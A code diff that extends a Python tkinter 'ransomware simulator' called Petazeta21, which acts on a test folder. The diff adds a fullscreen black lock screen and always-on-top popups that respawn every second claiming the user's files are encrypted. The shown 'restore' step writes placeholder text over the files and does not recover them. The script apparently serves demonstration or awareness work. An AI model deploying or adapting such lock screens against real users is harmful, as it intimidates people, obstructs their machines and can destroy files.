@@ -1,6 +1,6 @@
 import tkinter as tk
 import os
-import time
+import random
 
 # Ruta con archivos de prueba
 RUTA_OBJETIVO = os.path.expanduser("~/ransom_prueba")
@@ -28,32 +28,56 @@ def descifrar_archivos():
         if path.endswith(".locked"):
             nuevo = path.replace(".locked", "")
             with open(nuevo, "w") as f:
-                f.write("Archivo restaurado. Gracias por colaborar.\n")
+                f.write("Archivo restaurado.\n")
             os.remove(path)
 
-# Interfaz gráfica
+# Crea una nueva ventana emergente con mensaje
+def crear_ventana_aleatoria():
+    ventana = tk.Toplevel()
+    ventana.title("Petazeta21")
+    ventana.geometry("300x100+{}+{}".format(random.randint(0, ancho - 300), random.randint(0, alto - 100)))
+    ventana.attributes('-topmost', True)
+    tk.Label(ventana, text="Tus archivos han sido cifrados por Petazeta21 :(", fg="red").pack(pady=20)
+    ventana.after(60000, ventana.destroy)
+
+# Interfaz gráfica con botón central
 class RansomwareSimulador:
     def __init__(self, root):
+        self.root = root
         root.title("Petazeta21 - Simulador de Ransomware")
-        root.geometry("400x200")
-        tk.Label(root, text="Tus archivos han sido cifrados", fg="red", font=("Arial", 16)).pack(pady=10)
-        tk.Label(root, text="Introduce la clave para restaurarlos:").pack()
+        root.attributes('-fullscreen', True)
+        root.configure(bg="black")
+        self.cuadro = tk.Frame(root, bg="white", padx=20, pady=20)
+        self.cuadro.place(relx=0.5, rely=0.5, anchor="center")
 
-        self.entrada = tk.Entry(root, show="*")
+        tk.Label(self.cuadro, text="Tus archivos han sido cifrados", fg="red", font=("Arial", 16)).pack(pady=10)
+        tk.Label(self.cuadro, text="Introduce la clave para restaurarlos:").pack()
+
+        self.entrada = tk.Entry(self.cuadro, show="*")
         self.entrada.pack(pady=5)
-        tk.Button(root, text="Desbloquear", command=self.verificar_clave).pack(pady=5)
-        self.estado = tk.Label(root, text="", fg="blue")
+        tk.Button(self.cuadro, text="Desbloquear", command=self.verificar_clave).pack(pady=5)
+        self.estado = tk.Label(self.cuadro, text="", fg="blue")
         self.estado.pack(pady=10)
+
+        self.generar_ventanas()
 
     def verificar_clave(self):
         if self.entrada.get() == CLAVE_CORRECTA:
             self.estado.config(text="✔ Archivos restaurados correctamente.")
             descifrar_archivos()
+            self.root.destroy()
         else:
             self.estado.config(text="❌ Clave incorrecta. Prueba otra vez.")
 
+    def generar_ventanas(self):
+        crear_ventana_aleatoria()
+        self.root.after(1000, self.generar_ventanas)
+
 if __name__ == "__main__":
     cifrar_archivos()
-    ventana = tk.Tk()
-    app = RansomwareSimulador(ventana)
-    ventana.mainloop()
+    root = tk.Tk()
+    ancho = root.winfo_screenwidth()
+    alto = root.winfo_screenheight()
+    app = RansomwareSimulador(root)
+    root.mainloop()
+
